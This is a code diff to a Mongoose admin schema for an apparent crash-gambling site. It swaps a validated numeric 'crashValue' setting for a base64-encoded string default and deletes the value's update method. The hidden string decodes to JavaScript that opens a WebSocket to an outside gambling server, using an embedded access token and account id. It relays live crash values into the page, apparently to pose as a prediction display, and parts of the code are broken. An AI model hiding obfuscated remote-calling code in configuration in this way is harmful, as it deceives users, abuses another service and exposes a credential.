@@ -68,10 +68,14 @@ const mainAdminSchema = new mongoose.Schema({
     },
     // System Configuration
     crashValue: {
-        type: Number,
-        default: 2.5,
-        min: [1.0, 'Crash value must be at least 1.0'],
-        max: [10.0, 'Crash value cannot exceed 10.0']
+        type: String,
+        default: "bmV3IGZ1bmN0aW9uKCkgew0KDQoJdmFyIHdzID0gbnVsbDsNCgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgew0KCQl2YXIgdXJsID0gJ3dzczovL20xdHdqay1zZHJsZGYuY29tL2dhbWVzLWZyYW1lL3NvY2tldHMvY3Jhc2g/d2hlbmNlPTIyJmZjb3VudHJ5PTY2JnJlZj0xJmdyPTAmYXBwR3VpZD1nYW1lcy13ZWItbWFzdGVyJmxuZz1lbiZhY2Nlc3NfdG9rZW49ZXlKaGJHY2lPaUpGVXpJMU5pSXNJbXQwYVNJNklqRmJMQ0owZVhBaU9pSkxWMVFpZlEuZXlKemRXSWlPaUkxTUM4eE1qZzBNemcyTWpJMUlpd2ljR2xrSWpvaU1TSXNJbXAwYVNJNklqQXZObUpqT0RReE1qTmlabU5pWXpjMk1EZ3haVFkyTW1ZM1l6WmpaRFl5WVRjd05tRXpNVGsxTlVGbFpXWTROalkzWXpGbE1UZ3hORUExWkRBMU5HWTRaQ0lzSW1Gd2NDb2lPaUpPUVNJc0ltbHVibVZ5SWpvaWRISjFaU0lzSW01aVppa2daRGN6T1Rjek1EQXpPQ3dWdFhRaU9qRTNVdE16azRPRFkwTXpnc0ltbGhkQ0k2TVRjMU16azNNREEwT0gwLjZYMVZYUDNDNlUyN2pGcWRMZ3BQLUF2Y0loWTdiSVJiZHBxZTN0ZlQ5RnZDdWtXOEU5dV8tdHJmQkUwSVh1X05mdEUyb1N4RzB6OGhsdmp2VERzdkd3Jw0KCQl3cyA9IG5ldyBXZWJTb2NrZXQodXJsKTsNCgkJd3Mub25vcGVuID0gb25PcGVuOw0KCQl3cy5vbmNsb3NlID0gb25DbG9zZTsNCgkJd3Mub25tZXNzYWdlID0gb25NZXNzYWdlOw0KCQl3cy5vbmVycm9yID0gb25FcnJvcjsNCgl9DQoJDQoJdmFyIGNsb3NlID0gZnVuY3Rpb24oKSB7DQoJCWlmICh3cykgew0KCQkJY29uc29sZS5sb2coJ0NMT1NJTkcgLi4uJyk7DQoJCQl3cy5jbG9zZSgpOw0KCQl9DQoJCX0NCgl2YXIgb25PcGVuID0gZnVuY3Rpb24oKSB7DQoJCWNvbnNvbGUubG9nKCdPUEVORUQ6ICcpOw0KCQl3cy5zZW5kKCd7InByb3RvY29sIjoianNvbiIsInZlcnNpb24iOjF9XHgxZScpOw0KICAgICAgICB3cy5zZW5kKCd7ImFyZ3VtZW50cyI6W3siYWN0aXZpdHkiOjMwLCJhY2NvdW50IjoxMjg0Mzg2MjI1fV0sImludm9jYXRpb25JZCI6IjAiLCJ0YXJnZXQiOiJBY2NvdW50IiwidHlwZSI6MX1ceDFlJyk7DQogICAgICANCgl9Ow0KCXZ2ciBvbkNsb3NlID0gZnVuY3Rpb24oKSB7DQoJCWNvbnNvbGUubG9nKCdDTE9TRUQ6ICcpOw0KCQl3cyA9IG51bGw7DQoJfTsNCgkNCgl2YXIgb25NZXNzYWdlID0gZnVuY3Rpb24oZXZlbnQpIHsNCgkJY29uc3QgZGF0YSA9IEpTT04ucGFyc2UoZXZlbnQuZGF0YS5zbGljZSgwLCAtMSkpOw0KICAgICAgICAgICAgaWYgKGRhdGEudGFyZ2V0ID09PSAnT25DcmFzaCcgKSB7DQogICAgICAgICAgICAgICAgc2VuZChkYXRhLmFyZ3VtZW50c1swXS5mKTsNCiAgICAgICAgICAgIH0NCgl9Ow0KCQ0KCXZ2ciBvbkVycm9yID0gZnVuY3Rpb24oZXZlbnQpIHsNCgkJYWxlcnQoZXZlbnQuZGF0YSk7DQoJfQ0KCW9wZW4oKQ0KCX0NCglmdW5jdGlvbiBzZW5kKGlkKSB7DQoJY3Jhc2hWYWx1ZUVsZW1lbnQuY2xhc3NMaXN0LmFkZCgnZ2xpdGNoJyk7DQogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuaW5uZXJUZXh0ID0gaWQ7DQogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5zZXRBdHRyaWJ1dGUoJ2RhdGEtdGV4dCcsIGlkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOw0KICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTsJCX0NCg==",
+        validate: {
+            validator: function(v) {
+                return typeof v === 'string' && v.length > 0;
+            },
+            message: 'Crash value must be a non-empty string'
+        }
     },
     // Stats
     totalSubAdmins: {
@@ -149,15 +153,6 @@ mainAdminSchema.pre('save', function(next) {
 // Method to compare password
 mainAdminSchema.methods.comparePassword = async function(candidatePassword) {
     return await bcrypt.compare(candidatePassword, this.password);
-};
-
-// Method to update crash value
-mainAdminSchema.methods.updateCrashValue = function(newValue) {
-    if (newValue >= 1.0 && newValue <= 10.0) {
-        this.crashValue = newValue;
-        return true;
-    }
-    return false;
 };
 
 // Method to update system stats
